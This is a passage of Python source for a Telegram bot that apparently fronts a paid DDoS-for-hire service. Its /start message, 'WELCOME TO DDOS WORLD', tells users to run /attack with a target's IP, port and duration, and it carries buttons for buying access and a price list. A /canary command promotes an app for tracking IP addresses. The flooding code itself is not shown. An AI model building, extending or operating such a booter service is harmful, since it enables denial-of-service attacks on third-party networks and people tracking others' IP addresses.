        "💬 𝗪𝗲 𝘃𝗮𝗹𝘂𝗲 𝘆𝗼𝘂𝗿 𝗳𝗲𝗲𝗱𝗯𝗮𝗰𝗸! 𝗬𝗼𝘂𝗿 𝘁𝗵𝗼𝘂𝗴𝗵𝘁𝘀 𝗮𝗻𝗱 𝘀𝘂𝗴𝗴𝗲𝘀𝘁𝗶𝗼𝗻𝘀 𝗮𝗿𝗲 𝗰𝗿𝘂𝗰𝗶𝗮𝗹 𝗳𝗼𝗿 𝗶𝗺𝗽𝗿𝗼𝘃𝗶𝗻𝗴 𝗼𝘂𝗿 𝘀𝗲𝗿𝘃𝗶𝗰𝗲 𝗮𝗻𝗱 𝗲𝗻𝗵𝗮𝗻𝗰𝗶𝗻𝗴 𝘆𝗼𝘂𝗿 𝗲𝘅𝗽𝗲𝗿𝗶𝗲𝗻𝗰𝗲.\n\n"
        "🌟 𝗧𝗵𝗮𝗻𝗸 𝘆𝗼𝘂 𝗳𝗼𝗿 𝗯𝗲𝗶𝗻𝗴 𝗮 𝗽𝗮𝗿𝘁 𝗼𝗳 𝗼𝘂𝗿 𝗰𝗼𝗺𝗺𝘂𝗻𝗶𝘁𝘆! 𝗬𝗼𝘂𝗿 𝘀𝘂𝗽𝗽𝗼𝗿𝘁 𝗺𝗲𝗮𝗻𝘀 𝘁𝗵𝗲 𝘄𝗼𝗿𝗹𝗱 𝘁𝗼 𝘂𝘀, 𝗮𝗻𝗱 𝘄𝗲’𝗿𝗲 𝗮𝗹𝘄𝗮𝘆𝘀 𝗵𝗲𝗿𝗲 𝘁𝗼 𝗵𝗲𝗹𝗽!"
    )

    try:
        # Send the message with the inline keyboard
        bot.send_message(message.chat.id, response, reply_markup=markup, parse_mode='Markdown')
    except Exception as e:
        print(f"Error sending message: {e}")

from telebot import types

from telebot import types

@bot.message_handler(commands=['start'])
def start_message(message):
    # Create an inline keyboard with buttons arranged vertically
    markup = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(text="🔱 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗢𝗪𝗡𝗘𝗥 𝗧𝗢 𝗕𝗨𝗬 🔱", url="https://t.me/")
    button2 = types.InlineKeyboardButton(text="💸 𝗖𝗟𝗜𝗖𝗞 𝗣𝗥𝗜𝗖𝗘 𝗟𝗜𝗦𝗧 𝗛𝗘𝗥𝗘 💸", url="https://t.me/")
    button3 = types.InlineKeyboardButton(text="❤‍🩹 𝗝𝗢𝗜𝗡 𝗢𝗨𝗥 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗖𝗟𝗜𝗖𝗞 ❤‍🩹", url="https://t.me/")

    # Add buttons to the markup
    markup.add(button1)
    markup.add(button2)
    markup.add(button3)

    try:
        bot.send_message(
            message.chat.id, 
            "🌍 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗗𝗗𝗢𝗦 𝗪𝗢𝗥𝗟𝗗! 🎉\n\n"
            "🚀 𝗚𝗲𝘁 𝗿𝗲𝗮𝗱𝘆 𝘁𝗼 𝗱𝗶𝘃𝗲 𝗶𝗻𝘁𝗼 𝘁𝗵𝗲 𝗮𝗰𝘁𝗶𝗼𝗻!\n\n"
            "*💣 𝗧𝗼 𝘂𝗻𝗹𝗲𝗮𝘀𝗵 𝘆𝗼𝘂𝗿 𝗽𝗼𝘄𝗲𝗿, 𝘂𝘀𝗲 𝘁𝗵𝗲 `/attack` 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗳𝗼𝗹𝗹𝗼𝘄𝗲𝗱 𝗯𝘆 𝘆𝗼𝘂𝗿 𝘁𝗮𝗿𝗴𝗲𝘁'𝘀 𝗜𝗽 𝗮𝗻𝗱 𝗽𝗼𝗿𝘁. ⚔*\n\n"
            "*🔍 𝗘𝘅𝗮𝗺𝗽𝗹𝗲: 𝗔𝗳𝘁𝗲𝗿 `/attack`, 𝗲𝗻𝘁𝗲𝗿: `𝗶𝗽 𝗽𝗼𝗿𝘁 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻`.*\n\n"
            "🔥 𝗘𝗻𝘀𝘂𝗿𝗲 𝘆𝗼𝘂𝗿 𝘁𝗮𝗿𝗴𝗲𝘁 𝗶𝘀 𝗹𝗼𝗰𝗸𝗲𝗱 𝗶𝗻 𝗯𝗲𝗳𝗼𝗿𝗲 𝘆𝗼𝘂 𝘀𝘁𝗿𝗶𝗸𝗲!\n\n"
            "*📚 𝗡𝗲𝘄 𝗮𝗿𝗼𝘂𝗻𝗱 𝗵𝗲𝗿𝗲? 𝗖𝗵𝗲𝗰𝗸 𝗼𝘂𝘁 𝘁𝗵𝗲 `/help` 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝘁𝗼 𝗱𝗶𝘀𝗰𝗼𝘃𝗲𝗿 𝗮𝗹𝗹 𝗺𝘆 𝗰𝗮𝗽𝗮𝗯𝗶𝗹𝗶𝘁𝗶𝗲𝘀. 📜*\n\n"
            "⚠️ 𝗥𝗲𝗺𝗲𝗺𝗯𝗲𝗿, 𝘄𝗶𝘁𝗵 𝗴𝗿𝗲𝗮𝘁 𝗽𝗼𝘄𝗲𝗿 𝗰𝗼𝗺𝗲𝘀 𝗴𝗿𝗲𝗮𝘁 𝗿𝗲𝘀𝗽𝗼𝗻𝘀𝗶𝗯𝗶𝗹𝗶𝘁𝘆! 𝗨𝘀𝗲 𝗶𝘁 𝘄𝗶𝘀𝗲𝗹𝘆... 𝗼𝗿 𝗹𝗲𝘁 𝘁𝗵𝗲 𝗰𝗵𝗮𝗼𝘀 𝗿𝗲𝗶𝗴𝗻! 😈💥", 
            parse_mode='Markdown', 
            reply_markup=markup
        )
    except Exception as e:
        print(f"Error while processing /start command: {e}")



@bot.message_handler(commands=['canary'])
def canary_command(message):
    response = ("🚀 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝘁𝗵𝗲 𝗛𝘁𝘁𝗽𝗖𝗮𝗻𝗮𝗿𝘆 𝗔𝗽𝗸 𝗻𝗼𝘄! ✅\n\n"
                "🔍 𝗧𝗿𝗮𝗰𝗸 & 𝗺𝗮𝘁𝗰𝗵 𝗜𝗽 𝗮𝗱𝗱𝗿𝗲𝘀𝘀𝗲𝘀 𝗲𝗳𝗳𝗼𝗿𝘁𝗹𝗲𝘀𝘀𝗹𝘆! 🛠️\n\n"
                "💡 𝗨𝘀𝗲 𝗶𝘁 𝘄𝗶𝘀𝗲𝗹𝘆 𝗮𝗻𝗱 𝘀𝘁𝗮𝘆 𝗼𝗻𝗲 𝘀𝘁𝗲𝗽 𝗮𝗵𝗲𝗮𝗱 𝗶𝗻 𝘆𝗼𝘂𝗿 𝗼𝗻𝗹𝗶𝗻𝗲 𝗮𝗱𝘃𝗲𝗻𝘁𝘂𝗿𝗲𝘀! 🌐✨")
    
    # Inline keyboard with a button
    markup = types.InlineKeyboardMarkup()
    button = types.InlineKeyboardButton(text="🎁 𝗖𝗔𝗡𝗔𝗥𝗬 𝗔𝗣𝗞 𝗖𝗟𝗜𝗖𝗞 🎁", url="")
    button2 = types.InlineKeyboardButton(text="📱 𝗖𝗔𝗡𝗔𝗥𝗬 𝗙𝗢𝗥 𝗜𝗢𝗦 📱", url="https://apps.apple.com/in/app/surge-5/id1442620678")
    markup.add(button)
    markup.add(button2)

    bot.send_message(message.chat.id, response, parse_mode='Markdown', reply_markup=markup)


if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Codespace activity keeper and Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)
